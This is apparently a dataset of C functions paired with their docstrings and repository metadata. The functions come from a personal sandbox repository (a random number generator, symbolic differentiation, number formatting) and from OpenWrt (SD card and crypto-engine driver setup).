{"docstring": "/* If we are using the trivial TYPE_0 R.N.G., just do the old linear\n   congruential bit.  Otherwise, we do our fancy trinomial stuff, which is the\n   same in all ther other cases due to all the global variables that have been\n   set up.  The basic operation is to add the number at the rear pointer into\n   the one at the front pointer.  Then both pointers are advanced to the next\n   location cyclically in the table.  The value returned is the sum generated,\n   reduced to 31 bits by throwing away the \"least random\" low bit.\n   Note: The code takes advantage of the fact that both the front and\n   rear pointers can't wrap on the same call by not testing the rear\n   pointer if the front one has wrapped.  Returns a 31-bit random number.  */\n", "func_signal": "long random()", "code": "{\n  if (rand_type == TYPE_0)\n    {\n      state[0] = ((state[0] * 1103515245) + 12345) & MAXLONG;\n      return state[0];\n    }\n  else\n    {\n      long i;\n      *fptr += *rptr;\n      /* Chucking least random bit.  */\n      i = (*fptr >> 1) & MAXLONG;\n      ++fptr;\n      if (fptr >= end_ptr)\n\t{\n\t  fptr = state;\n\t  ++rptr;\n\t}\n      else\n\t{\n\t  ++rptr;\n\t  if (rptr >= end_ptr)\n\t    rptr = state;\n\t}\n      return i;\n    }\n}", "path": "joes-sandbox/xenix/draft/random.c", "commit_date": "2014-10-20 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Take derivative of list */\n/* if flg==0, take partial derivative.  if flg==1, take\n   derivative with respect to wrt */\n", "func_signal": "LST *deriv(LST *n, int flg, SYM *wrt)", "code": "{\n\tSYM *sy;\n\tif (!n)\n\t\treturn n;\n\tif (typ(n) == tNUM)\n\t\treturn (LST *)newnum(0.0);\n\n\tif (typ(n) == tSYM)\n\t\tif (flg)\n\t\t\tif ((SYM *)n == wrt)\n\t\t\t\treturn (LST *)dupnum(yONE);\n\t\t\telse\n\t\t\t\treturn (LST *)dupnum(yZERO);\n\t\telse\n\t\t\treturn ncons(2, yD, n);\n\n\tsy = (SYM *)n->d;\n\n\tif (sy == yNEG)\n\t\treturn simplify(ncons(2, yNEG, deriv(n->r->d, flg, wrt)), 0, 0);\n\n\telse if (sy == yEXP) {\n\t\treturn simplify(ncons(3, yADD,\n\t\t\t\t      ncons(3, yMUL,\n\t\t\t\t\t    ncons(3, yMUL,\n\t\t\t\t\t\t  ncons(3, yEXP,\n\t\t\t\t\t\t\tdup(n->r->d),\n\t\t\t\t\t\t\tncons(3, ySUB,\n\t\t\t\t\t\t\t      dup(n->r->r->d),\n\t\t\t\t\t\t\t      newnum(1.0)\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t  ), dup(n->r->r->d)\n\t\t\t\t\t    ), deriv(n->r->d, flg, wrt)\n\t\t\t\t      ),\n\t\t\t\t      ncons(3, yMUL,\n\t\t\t\t\t    ncons(3, yMUL,\n\t\t\t\t\t\t  dup(n),\n\t\t\t\t\t\t  ncons(2, yLOG, dup(n->r->d))\n\t\t\t\t\t    ), deriv(n->r->r->d, flg, wrt)\n\t\t\t\t      )\n\t\t\t\t), 0, 0);\n\t} else if (sy == ySQRT)\n\t\treturn simplify(ncons(3, yMUL,\n\t\t\t\t      ncons(3, yDIV,\n\t\t\t\t\t    dupnum(yONE),\n\t\t\t\t\t    ncons(3, yMUL, dupnum(yTWO), dup(n)\n\t\t\t\t\t    )\n\t\t\t\t      ), deriv(n->r->d, flg, wrt)\n\t\t\t\t), 0, 0);\n\n\telse if (sy == yMUL)\n\t\treturn\n\t\t    simplify(ncons\n\t\t\t     (3, yADD,\n\t\t\t      ncons(3, yMUL, dup(n->r->d),\n\t\t\t\t    deriv(n->r->r->d, flg, wrt)), ncons(3, yMUL,\n\t\t\t\t\t\t\t\t\tdup(n->\n\t\t\t\t\t\t\t\t\t    r->\n\t\t\t\t\t\t\t\t\t    r->\n\t\t\t\t\t\t\t\t\t    d),\n\t\t\t\t\t\t\t\t\tderiv\n\t\t\t\t\t\t\t\t\t(n->r->\n\t\t\t\t\t\t\t\t\t d, flg,\n\t\t\t\t\t\t\t\t\t wrt))),\n\t\t\t     0, 0);\n\n\telse if (sy == yDIV) {\n\t\tNUM *num = newnum(2.0);\n\t\treturn simplify(ncons(3, yDIV,\n\t\t\t\t      ncons(3, ySUB,\n\t\t\t\t\t    ncons(3, yMUL,\n\t\t\t\t\t\t  dup(n->r->r->d),\n\t\t\t\t\t\t  deriv(n->r->d, flg, wrt)\n\t\t\t\t\t    ),\n\t\t\t\t\t    ncons(3, yMUL,\n\t\t\t\t\t\t  dup(n->r->d),\n\t\t\t\t\t\t  deriv(n->r->r->d, flg, wrt)\n\t\t\t\t\t    )\n\t\t\t\t      ), ncons(3, yEXP, dup(n->r->r->d), num)\n\t\t\t\t), 0, 0);\n\t}\n\n\telse if (sy == yADD)\n\t\treturn\n\t\t    simplify(ncons\n\t\t\t     (3, yADD, deriv(n->r->d, flg, wrt),\n\t\t\t      deriv(n->r->r->d, flg, wrt)), 0, 0);\n\n\telse if (sy == ySUB)\n\t\treturn\n\t\t    simplify(ncons\n\t\t\t     (3, ySUB, deriv(n->r->d, flg, wrt),\n\t\t\t      deriv(n->r->r->d, flg, wrt)), 0, 0);\n\n\telse if (sy == yEQ)\n\t\treturn ncons(3, yEQ, deriv(n->r->d, flg, wrt),\n\t\t\t     deriv(n->r->r->d, flg, wrt));\n\n\telse if (sy == ySIN)\n\t\treturn\n\t\t    simplify(ncons\n\t\t\t     (3, yMUL, ncons(2, yCOS, dup(n->r->d)),\n\t\t\t      deriv(n->r->d, flg, wrt)), 0, 0);\n\n\telse if (sy == yCOS)\n\t\treturn\n\t\t    simplify(ncons\n\t\t\t     (3, yMUL,\n\t\t\t      ncons(2, yNEG, ncons(2, ySIN, dup(n->r->d))),\n\t\t\t      deriv(n->r->d, flg, wrt)), 0, 0);\n\n\tif (flg)\n\t\treturn ncons(2, yDERV, dup(n));\n\telse\n\t\treturn ncons(2, yD, dup(n));\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Convert floating point ascii number into engineering format */\n", "func_signal": "char *eng(char *d, size_t d_len, const char *s)", "code": "{\n\tconst char *s_org = s;\n\tchar *d_org = d;\n\tchar a[1024];\n\tint a_len;\n\tint sign;\n\tint dp;\n\tint exp;\n\tint exp_sign;\n\tint x;\n\tint flg = 0;\n\n\t--d_len; /* For terminator */\n\n\t/* Get sign of number */\n\tif (*s == '-') {\n\t\tsign = 1;\n\t\t++s;\n\t} else if (*s == '+') {\n\t\tsign = 0;\n\t\t++s;\n\t} else {\n\t\tsign = 0;\n\t}\n\n\t/* Read digits before decimal point */\n\t/* Skip leading zeros */\n\twhile (*s == '0') {\n\t\tflg = 1;\n\t\t++s;\n\t}\n\ta_len = 0;\n\twhile (*s >= '0' && *s <= '9') {\n\t\ta[a_len++] = *s++;\n\t\tflg = 1;\n\t}\n\t/* Decimal point? */\n\tdp = 0;\n\tif (*s == '.') {\n\t\tflg = 1;\n\t\t++s;\n\t\t/* If we don't have any digits yet, trim leading zeros */\n\t\tif (!a_len) {\n\t\t\twhile (*s == '0') {\n\t\t\t\t++s;\n\t\t\t\t++dp;\n\t\t\t}\n\t\t}\n\t\tif (*s >= '0' && *s <= '9') {\n\t\t\twhile (*s >= '0' && *s <= '9') {\n\t\t\t\ta[a_len++] = *s++;\n\t\t\t\t++dp;\n\t\t\t}\n\t\t} else {\n\t\t\t/* No non-zero digits? */\n\t\t\tdp = 0;\n\t\t}\n\t}\n\t/* Trim trailing zeros */\n\twhile (a_len && a[a_len - 1] == '0') {\n\t\t--a_len;\n\t\t--dp;\n\t}\n\n\t/* Exponent? */\n\tif (*s == 'e' || *s == 'E') {\n\t\t++s;\n\t\tif (*s == '-') {\n\t\t\t++s;\n\t\t\texp_sign = 1;\n\t\t} else if (*s == '+') {\n\t\t\t++s;\n\t\t\texp_sign = 0;\n\t\t} else {\n\t\t\texp_sign = 0;\n\t\t}\n\t\texp = 0;\n\t\twhile  (*s >= '0' && *s <= '9') {\n\t\t\texp = exp * 10 + *s++ - '0';\n\t\t}\n\t} else {\n\t\texp = 0;\n\t\texp_sign = 0;\n\t}\n\n\t/* s should be at end of number now */\n\tif (!flg) { /* No digits found? */\n\t\tstrlcpy(d, s_org, d_len);\n\t\treturn d;\n\t}\n\n\t/* Sign of exponent */\n\tif (exp_sign)\n\t\texp = -exp;\n\t/* Account of position of decimal point in exponent */\n\texp -= dp;\n\n\ta[a_len] = 0;\n\n\t/* For engineering format, make expoenent a multiple of 3 such that\n\t   we have 1 - 3 leading digits */\n\n\t/* Don't assume modulus of negative number works consistently */\n\tif (exp < 0) {\n\t\tswitch((-exp) % 3) {\n\t\t\tcase 0: x = 0; break;\n\t\t\tcase 1: x = 2; break;\n\t\t\tcase 2: x = 1; break;\n\t\t}\n\t} else {\n\t\tx = (exp % 3);\n\t}\n\n\t/* Make exponent a multiple of 3 */\n\texp -= x;\n\n\t/* Add zeros to mantissa to account for this */\n\twhile (x--) {\n\t\ta[a_len++] = '0';\n\t}\n\n\t/* If number has no digits, add one now */\n\tif (!a_len)\n\t\ta[a_len++] = '0';\n\n\t/* Position decimal point near the left */\n\tdp = (a_len - 1) / 3;\n\tdp *= 3;\n\n\t/* Adjust exponent for this */\n\texp += dp;\n\n\t/* Now print */\n\tif (sign && d_len) {\n\t\t*d++ = '-';\n\t\t--d_len;\n\t}\n\n\t/* Digits to left of decimal point */\n\tfor (x = 0; x != a_len - dp; ++x) {\n\t\tif (d_len) {\n\t\t\t*d++ = a[x];\n\t\t\t--d_len;\n\t\t}\n\t}\n\n\t/* Any more digits? */\n\tif (dp) {\n\t\tif (d_len) {\n\t\t\t*d++ = '.';\n\t\t\t--d_len;\n\t\t}\n\t\tfor (x = a_len - dp; x != a_len; ++x) {\n\t\t\tif (d_len) {\n\t\t\t\t*d++ = a[x];\n\t\t\t\t--d_len;\n\t\t\t}\n\t\t}\n\t\t/* Trim trailing zeros */\n\t\twhile (d != d_org && d[-1] == '0') {\n\t\t\t--d;\n\t\t\t++d_len;\n\t\t}\n\t}\n\n\t/* Exponent? */\n\tif (exp) {\n\t\tsnprintf(d, d_len + 1, \"e%d\", exp);\n\t} else {\n\t\t*d = 0;\n\t}\n\n\treturn d_org;\n}", "path": "joes-sandbox/math/eng.c", "commit_date": "2015-11-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Conflict resolution function */\n", "func_signal": "int decide(yyVAL lookahead)", "code": "{\n\t/* Value from top of stack */\n\tyyVAL top = stack->stack[stack->sp].value;\n\n\t/* Skip whitespace */\n\twhile (s[++col] == ' ');\n\n\tif (lookahead->start - top->end <= col - lookahead->end) {\t/* If '-' is closer to thing on left */\n\t\t--col;\n\t\treturn 0;\t/* Shift */\n\t} else {\t\t/* If '-' is closer to thing on right */\n\t\t--col;\n\t\treturn 1;\t/* Reduce */\n\t}\n}", "path": "joes-sandbox/lang/aacc/calc1.c", "commit_date": "2014-10-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Remove constant multiplied by a term.  Only works after it has been\n   simplified. */\n", "func_signal": "LST *getconst(LST *q, double *t, double *b)", "code": "{\n\t*t = 1.0;\n\t*b = 1.0;\n\tif (q)\n\t\tif (typ(q) == tLST) {\n\t\t\tif ((SYM *)q->d == yMUL) {\n\t\t\t\tif (q->r->d && typ(q->r->d) == tNUM) {\n\t\t\t\t\tLST *l;\n\t\t\t\t\t*t = ((NUM *) q->r->d)->n;\n\t\t\t\t\tl = q;\n\t\t\t\t\tq = q->r->r->d;\n\t\t\t\t\tl->r->r->d = 0;\n\t\t\t\t\tdiscard(l);\n\t\t\t\t}\n\t\t\t} else if ((SYM *)q->d == yDIV) {\n\t\t\t\tLST *qq = q->r->d;\n\t\t\t\tif (qq && typ(qq) == tNUM)\n\t\t\t\t\t*t = ((NUM *) qq)->n, ((NUM *) qq)->n =\n\t\t\t\t\t    1.0;\n\t\t\t\telse if (qq && typ(qq) == tLST && (SYM *)qq->d == yMUL\n\t\t\t\t\t && qq->r->d && typ(qq->r->d) == tNUM) {\n\t\t\t\t\t*t = ((NUM *) qq->r->d)->n;\n\t\t\t\t\tq->r->d = qq->r->r->d;\n\t\t\t\t\tqq->r->r->d = 0;\n\t\t\t\t\tdiscard(qq);\n\t\t\t\t}\n\t\t\t\tqq = q->r->r->d;\n\t\t\t\tif (qq && typ(qq) == tNUM) {\n\t\t\t\t\t*b = ((NUM *) qq)->n;\n\t\t\t\t\tqq = q;\n\t\t\t\t\tq = q->r->d;\n\t\t\t\t\tqq->r->d = 0;\n\t\t\t\t\tdiscard(qq);\n\t\t\t\t} else if (qq && typ(qq) == tLST\n\t\t\t\t\t   && (SYM *)qq->d == yMUL && qq->r->d\n\t\t\t\t\t   && typ(qq->r->d) == tNUM) {\n\t\t\t\t\t*b = ((NUM *) qq->r->d)->n;\n\t\t\t\t\tq->r->r->d = qq->r->r->d;\n\t\t\t\t\tqq->r->r->d = 0;\n\t\t\t\t\tdiscard(qq);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\treturn q;\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SDCard_Init\n//* \\brief Return the SDCard initialisation status\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SDCard_Init (AT91PS_MciDevice pMCI_Device)", "code": "{\n    unsigned int\ttab_response[4];\n\tunsigned int\tmult,blocknr;\n\n\tAT91F_MCI_SendCommand(pMCI_Device, AT91C_GO_IDLE_STATE_CMD, AT91C_NO_ARGUMENT);\n\n    if(AT91F_MCI_SDCard_GetOCR(pMCI_Device) == AT91C_INIT_ERROR)\n    \treturn AT91C_INIT_ERROR;\n\n\tif (AT91F_MCI_SDCard_GetCID(pMCI_Device,tab_response) == AT91C_CMD_SEND_OK)\n\t{\n\t    pMCI_Device->pMCI_DeviceFeatures->Card_Inserted = AT91C_SD_CARD_INSERTED;\n\n\t    if (AT91F_MCI_SendCommand(pMCI_Device, AT91C_SET_RELATIVE_ADDR_CMD, 0) == AT91C_CMD_SEND_OK)\n\t\t{\n\t\t\tpMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address = (AT91C_BASE_MCI->MCI_RSPR[0] >> 16);\n\t\t\tif (AT91F_MCI_GetCSD(pMCI_Device,pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address,tab_response) == AT91C_CMD_SEND_OK)\n\t\t\t{\n\t\t  \t\tpMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length = 1 << ((tab_response[1] >> AT91C_CSD_RD_B_LEN_S) & AT91C_CSD_RD_B_LEN_M );\n\t \t\t\tpMCI_Device->pMCI_DeviceFeatures->Max_Write_DataBlock_Length =\t1 << ((tab_response[3] >> AT91C_CSD_WBLEN_S) & AT91C_CSD_WBLEN_M );\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Sector_Size = 1 + ((tab_response[2] >> AT91C_CSD_v21_SECT_SIZE_S) & AT91C_CSD_v21_SECT_SIZE_M );\n\t\t  \t\tpMCI_Device->pMCI_DeviceFeatures->Read_Partial = (tab_response[1] >> AT91C_CSD_RD_B_PAR_S) & AT91C_CSD_RD_B_PAR_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Write_Partial = (tab_response[3] >> AT91C_CSD_WBLOCK_P_S) & AT91C_CSD_WBLOCK_P_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Erase_Block_Enable = (tab_response[3] >> AT91C_CSD_v21_ER_BLEN_EN_S) & AT91C_CSD_v21_ER_BLEN_EN_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Read_Block_Misalignment = (tab_response[1] >> AT91C_CSD_RD_B_MIS_S) & AT91C_CSD_RD_B_MIS_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Write_Block_Misalignment = (tab_response[1] >> AT91C_CSD_WR_B_MIS_S) & AT91C_CSD_WR_B_MIS_M;\n\n\t\t\t\t//// Compute Memory Capacity\n\t\t\t\t\t// compute MULT\n\t\t\t\t\tmult = 1 << ( ((tab_response[2] >> AT91C_CSD_C_SIZE_M_S) & AT91C_CSD_C_SIZE_M_M) + 2 );\n\t\t\t\t\t// compute MSB of C_SIZE\n\t\t\t\t\tblocknr = ((tab_response[1] >> AT91C_CSD_CSIZE_H_S) & AT91C_CSD_CSIZE_H_M) << 2;\n\t\t\t\t\t// compute MULT * (LSB of C-SIZE + MSB already computed + 1) = BLOCKNR\n\t\t\t\t\tblocknr = mult * ( ( blocknr + ( (tab_response[2] >> AT91C_CSD_CSIZE_L_S) & AT91C_CSD_CSIZE_L_M) ) + 1 );\n\n\t\t\t\t\tpMCI_Device->pMCI_DeviceFeatures->Memory_Capacity =  pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length * blocknr;\n\t\t\t  \t//// End of Compute Memory Capacity\n\t\t\t\t\tprintf(\"SD-Card: %d Bytes\\n\\r\", pMCI_Device->pMCI_DeviceFeatures->Memory_Capacity);\n\n\t\t  \t\tif( AT91F_MCI_SDCard_SetBusWidth(pMCI_Device) == AT91C_CMD_SEND_OK )\n\t\t\t\t{\t\n\t\t\t\t\t if (AT91F_MCI_SetBlocklength(pMCI_Device,pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length) == AT91C_CMD_SEND_OK)\n\t\t\t\t\treturn AT91C_INIT_OK;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n    return AT91C_INIT_ERROR;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_GetStatus\n//* \\brief Addressed card sends its status register\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_GetStatus(AT91PS_MciDevice pMCI_Device,unsigned int relative_card_address)", "code": "{\n\tif (AT91F_MCI_SendCommand(pMCI_Device,\n\t\t\t\t\t\t\t\tAT91C_SEND_STATUS_CMD,\n\t\t\t\t\t\t\t\trelative_card_address <<16) == AT91C_CMD_SEND_OK)\n    \treturn (AT91C_BASE_MCI->MCI_RSPR[0]);\n\n    return AT91C_CMD_SEND_ERROR;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SendCommand\n//* \\brief Generic function to send a command to the MMC or SDCard\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SendCommand (\n\tAT91PS_MciDevice pMCI_Device,\n\tunsigned int Cmd,\n\tunsigned int Arg)", "code": "{\n\tunsigned int\terror,status;\n\t//unsigned int\ttick=0;\n\n    // Send the command\n    AT91C_BASE_MCI->MCI_ARGR = Arg;\n    AT91C_BASE_MCI->MCI_CMDR = Cmd;\n\n\t// wait for CMDRDY Status flag to read the response\n\tdo\n\t{\n\t\tstatus = AT91C_BASE_MCI->MCI_SR;\n\t\t//tick++;\n\t}\n\twhile( !(status & AT91C_MCI_CMDRDY) );//&& (tick<100) );\n\n    // Test error  ==> if crc error and response R3 ==> don't check error\n    error = (AT91C_BASE_MCI->MCI_SR) & AT91C_MCI_SR_ERROR;\n\tif(error != 0 )\n\t{\n\t\t// if the command is SEND_OP_COND the CRC error flag is always present (cf : R3 response)\n\t\tif ( (Cmd != AT91C_SDCARD_APP_OP_COND_CMD) && (Cmd != AT91C_MMC_SEND_OP_COND_CMD) )\n\t\t\treturn ((AT91C_BASE_MCI->MCI_SR) & AT91C_MCI_SR_ERROR);\n\t\telse\n\t\t{\n\t\t\tif (error != AT91C_MCI_RCRCE)\n\t\t\t\treturn ((AT91C_BASE_MCI->MCI_SR) & AT91C_MCI_SR_ERROR);\n\t\t}\n\t}\n    return AT91C_CMD_SEND_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_GetCSD\n//* \\brief Asks to the specified card to send its CSD\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_GetCSD (AT91PS_MciDevice pMCI_Device, unsigned int relative_card_address , unsigned int * response)", "code": "{\n \t\n \tif(AT91F_MCI_SendCommand(pMCI_Device,\n\t\t\t\t\t\t\t\t  AT91C_SEND_CSD_CMD,\n\t\t\t\t\t\t\t\t  (relative_card_address << 16)) != AT91C_CMD_SEND_OK)\n\t\treturn AT91C_CMD_SEND_ERROR;\n\t\n    response[0] = AT91C_BASE_MCI->MCI_RSPR[0];\n   \tresponse[1] = AT91C_BASE_MCI->MCI_RSPR[1];\n    response[2] = AT91C_BASE_MCI->MCI_RSPR[2];\n    response[3] = AT91C_BASE_MCI->MCI_RSPR[3];\n    \n    return AT91C_CMD_SEND_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SDCard_GetOCR\n//* \\brief Asks to all cards to send their operations conditions\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SDCard_GetOCR (AT91PS_MciDevice pMCI_Device)", "code": "{\n\tunsigned int\tresponse =0x0;\n\n\t// The RCA to be used for CMD55 in Idle state shall be the card's default RCA=0x0000.\n\tpMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address = 0x0;\n \t\n \twhile( (response & AT91C_CARD_POWER_UP_BUSY) != AT91C_CARD_POWER_UP_BUSY )\n    {\n    \tresponse = AT91F_MCI_SDCard_SendAppCommand(pMCI_Device,\n  \t\t\t\t\t\t\t\t\t\tAT91C_SDCARD_APP_OP_COND_CMD,\n  \t\t\t\t\t\t\t\t\t\tAT91C_MMC_HOST_VOLTAGE_RANGE);\n\t\tif (response != AT91C_CMD_SEND_OK)\n\t\t\treturn AT91C_INIT_ERROR;\n\t\t\n\t\tresponse = AT91C_BASE_MCI->MCI_RSPR[0];\n\t}\n\t\n\treturn(AT91C_BASE_MCI->MCI_RSPR[0]);\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_CfgDevice\n//* \\brief This function is used to initialise MMC or SDCard Features\n//*----------------------------------------------------------------------------\n", "func_signal": "void AT91F_CfgDevice(void)", "code": "{\n\t// Init Device Structure\n\n\tMCI_Device_Features.Relative_Card_Address \t\t= 0;\n\tMCI_Device_Features.Card_Inserted \t\t\t\t= AT91C_CARD_REMOVED;\n\tMCI_Device_Features.Max_Read_DataBlock_Length\t= 0;\n\tMCI_Device_Features.Max_Write_DataBlock_Length \t= 0;\n\tMCI_Device_Features.Read_Partial \t\t\t\t= 0;\n\tMCI_Device_Features.Write_Partial \t\t\t\t= 0;\n\tMCI_Device_Features.Erase_Block_Enable \t\t\t= 0;\n\tMCI_Device_Features.Sector_Size \t\t\t\t= 0;\n\tMCI_Device_Features.Memory_Capacity \t\t\t= 0;\n\t\n\tMCI_Device_Desc.state\t\t\t\t\t\t\t= AT91C_MCI_IDLE;\n\tMCI_Device_Desc.SDCard_bus_width\t\t\t\t= AT91C_MCI_SCDBUS;\n\t\n\t// Init AT91S_DataFlash Global Structure, by default AT45DB choosen !!!\n\tMCI_Device.pMCI_DeviceDesc \t\t= &MCI_Device_Desc;\n\tMCI_Device.pMCI_DeviceFeatures \t= &MCI_Device_Features;\n\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "/* MV_CESA_VERSION >= 2 */\n", "func_signal": "MV_STATUS mvCesaInit (int numOfSession, int queueDepth, char* pSramBase, void *osHandle)", "code": "{\n    MV_U32 cesaCryptEngBase;\n    MV_CPU_DEC_WIN addrDecWin;\n\n    if(sizeof(MV_CESA_SRAM_MAP) > MV_CESA_SRAM_SIZE)\n    {\n        mvOsPrintf(\"mvCesaInit: Wrong SRAM map - %ld > %d\\n\",\n                sizeof(MV_CESA_SRAM_MAP), MV_CESA_SRAM_SIZE);\n        return MV_FAIL;\n    }\n#if 0\n    if (mvCpuIfTargetWinGet(CRYPT_ENG, &addrDecWin) == MV_OK)\n        cesaCryptEngBase = addrDecWin.addrWin.baseLow;\n    else\n    {\n        mvOsPrintf(\"mvCesaInit: ERR. mvCpuIfTargetWinGet failed\\n\");\n        return MV_ERROR;\n    }\n#else\n        cesaCryptEngBase = (MV_U32)pSramBase;\n#endif     \n\n#if 0 /* Already done in the platform init */\n#if (MV_CESA_VERSION >= 2)\n    mvCesaTdmaAddrDecInit();\n#endif /* MV_CESA_VERSION >= 2 */\n#endif\n\treturn mvCesaHalInit(numOfSession, queueDepth, pSramBase, cesaCryptEngBase, \n\t\t\t     osHandle);\n\n}", "path": "openwrt/target/linux/generic/files/crypto/ocf/kirkwood/mvHal/kw_family/ctrlEnv/sys/mvSysCesa.c", "commit_date": "2010-06-26 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "/*******************************************************************************\n* mvCesaTdmaWinSet - Set CESA TDMA target address window\n*\n* DESCRIPTION:\n*       This function sets a peripheral target (e.g. SDRAM bank0, PCI_MEM0) \n*       address window, also known as address decode window. \n*       After setting this target window, the CESA TDMA will be able to access the \n*       target within the address window. \n*\n* INPUT:\n*       winNum      - CESA TDMA target address decode window number.\n*       pAddrDecWin - CESA TDMA target window data structure.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       MV_ERROR        - if address window overlapps with other address decode windows.\n*       MV_BAD_PARAM    - if base address is invalid parameter or target is \n*                       unknown.\n*\n*******************************************************************************/\n", "func_signal": "static MV_STATUS mvCesaTdmaWinSet(MV_U32 winNum, MV_DEC_WIN *pDecWin)", "code": "{\n    MV_DEC_WIN_PARAMS   winParams;\n    MV_U32              sizeReg, baseReg;\n    \n    /* Parameter checking   */\n    if (winNum >= MV_CESA_TDMA_ADDR_DEC_WIN)\n    {\n        mvOsPrintf(\"mvCesaTdmaWinSet: ERR. Invalid win num %d\\n\",winNum);\n        return MV_BAD_PARAM;\n    }\n\n    /* Check if the requested window overlapps with current windows     */\n    if (MV_TRUE == cesaWinOverlapDetect(winNum, &pDecWin->addrWin))\n    {\n        mvOsPrintf(\"%s: ERR. Window %d overlap\\n\", __FUNCTION__, winNum);\n        return MV_ERROR;\n    }\n\n    /* check if address is aligned to the size */\n    if(MV_IS_NOT_ALIGN(pDecWin->addrWin.baseLow, pDecWin->addrWin.size))\n    {\n        mvOsPrintf(\"mvCesaTdmaWinSet: Error setting CESA TDMA window %d to \"\\\n                   \"target %s.\\nAddress 0x%08x is unaligned to size 0x%x.\\n\",\n                   winNum,\n                   mvCtrlTargetNameGet(pDecWin->target), \n                   pDecWin->addrWin.baseLow,\n                   pDecWin->addrWin.size);\n        return MV_ERROR;\n    }\n\n    if(MV_OK != mvCtrlAddrDecToParams(pDecWin, &winParams))\n    {\n        mvOsPrintf(\"%s: mvCtrlAddrDecToParams Failed\\n\", __FUNCTION__);\n        return MV_ERROR;\n    }\n\n    /* set Size, Attributes and TargetID */\n    sizeReg = (((winParams.targetId << MV_CESA_TDMA_WIN_TARGET_OFFSET) & MV_CESA_TDMA_WIN_TARGET_MASK) |\n               ((winParams.attrib   << MV_CESA_TDMA_WIN_ATTR_OFFSET)   & MV_CESA_TDMA_WIN_ATTR_MASK)   |\n               ((winParams.size << MV_CESA_TDMA_WIN_SIZE_OFFSET) & MV_CESA_TDMA_WIN_SIZE_MASK));\n\n    if (pDecWin->enable == MV_TRUE)\n    {\n        sizeReg |= MV_CESA_TDMA_WIN_ENABLE_MASK;\n    }\n    else\n    {\n        sizeReg &= ~MV_CESA_TDMA_WIN_ENABLE_MASK;\n    }\n\n    /* Update Base value  */\n    baseReg = (winParams.baseAddr & MV_CESA_TDMA_WIN_BASE_MASK);     \n\n    MV_REG_WRITE( MV_CESA_TDMA_WIN_CTRL_REG(winNum), sizeReg);\n    MV_REG_WRITE( MV_CESA_TDMA_BASE_ADDR_REG(winNum), baseReg);\n        \n    return MV_OK;\n}", "path": "openwrt/target/linux/generic/files/crypto/ocf/kirkwood/mvHal/kw_family/ctrlEnv/sys/mvSysCesa.c", "commit_date": "2010-06-26 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
